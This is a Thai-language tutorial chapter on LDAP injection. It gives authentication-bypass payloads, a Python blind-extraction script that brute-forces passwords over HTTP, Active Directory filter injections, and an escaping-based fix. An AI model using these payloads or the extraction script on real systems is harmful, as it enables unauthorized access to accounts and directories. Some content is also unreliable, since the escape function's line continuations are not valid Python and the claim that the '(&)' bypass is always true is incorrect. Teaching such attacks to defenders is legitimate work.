# Part 039: LDAP Injection

## ภาพรวม

LDAP Injection เป็นการโจมตี LDAP (Lightweight Directory Access Protocol) queries ที่ใช้สำหรับ Active Directory หรือ directory services

**ขั้นตอนที่ 591-605**

---

## 591. LDAP พื้นฐาน

```
LDAP Filter Syntax:

(&(condition1)(condition2))  -- AND
(|(condition1)(condition2))  -- OR
(!(condition))               -- NOT

ตัวอย่าง:
(&(uid=admin)(userPassword=password))  -- login query
(|(cn=john)(cn=jane))                  -- OR query
(&(objectClass=user)(!(disabled=TRUE))) -- active users
```

---

## 592. LDAP Injection เทคนิค

```
Vulnerable PHP code:
$filter = "(&(uid=$username)(userPassword=$password))";

เหมือน SQL injection - ใช้ special chars:
( ) * \ \x00

Bypass เทคนิค:
username: admin)(&
password: anything

Filter กลายเป็น:
(&(uid=admin)(&)(userPassword=anything))
-- (&) = always true!

username: *)(&
password: *
Filter: (&(uid=*)(&)(userPassword=*))
-- uid=* = ทุก user!
```

---

## 593. LDAP Authentication Bypass

```python
import ldap

def vulnerable_login(username, password):
    conn = ldap.initialize('ldap://localhost:389')
    # VULNERABLE - string concatenation
    filter = f"(&(uid={username})(userPassword={password}))"
    result = conn.search_s('dc=example,dc=com', ldap.SCOPE_SUBTREE, filter)
    return len(result) > 0

# Attack
print(vulnerable_login("admin)(&", "anything"))  # True!
print(vulnerable_login("*)(&", "*"))              # Gets all users!

# SECURE version
def secure_login(username, password):
    # Escape LDAP special chars
    def escape_ldap(s):
        return s.replace('\\', '\\5c').replace('*', '\\2a') \\
                .replace('(', '\\28').replace(')', '\\29') \\
                .replace('\x00', '\\00')
    
    safe_user = escape_ldap(username)
    safe_pass = escape_ldap(password)
    
    conn = ldap.initialize('ldap://localhost:389')
    filter = f"(&(uid={safe_user})(userPassword={safe_pass}))"
    result = conn.search_s('dc=example,dc=com', ldap.SCOPE_SUBTREE, filter)
    return len(result) > 0
```

---

## 594. LDAP Blind Injection

```
สุ่มไปทีละตัว:

username: admin)(userPassword=a*
-- ถ้า login สำเร็จ = password เริ่มต้นด้วย 'a'

username: admin)(userPassword=b*
username: admin)(userPassword=ba*
...
username: admin)(userPassword=secret1*  -- found!
```

```python
def ldap_blind_extract_password(url, target_user):
    result = ""
    charset = 'abcdefghijklmnopqrstuvwxyz0123456789!@#$'
    
    for pos in range(1, 50):
        found = False
        for c in charset:
            # Test if password at position pos starts with c
            username = f"{target_user})(userPassword={result}{c}*"
            r = requests.post(url, data={'username': username, 'password': 'x'})
            
            if 'success' in r.text.lower():
                result += c
                found = True
                break
        
        if not found:
            break
    
    return result
```

---

## 595. Active Directory Injection

```
Active Directory LDAP filter:
(&(sAMAccountName=john)(objectCategory=person)(objectClass=user))

Injection:
username: john)(objectClass=*
-- เห็นทุก object!

-- เข้าถึง admin group
username: john)(memberOf=CN=Administrators,DC=example,DC=com
```

---

## สรุป

LDAP Injection:
- **( ) * \** - special LDAP characters
- **Auth bypass** - )(&)( trick
- **Blind extraction** - wildcard matching
- **Active Directory** - memberOf bypass
- **Prevention** - escape LDAP special chars

---

*Part 039 | SQL Injection Course | สำหรับการศึกษาเท่านั้น*
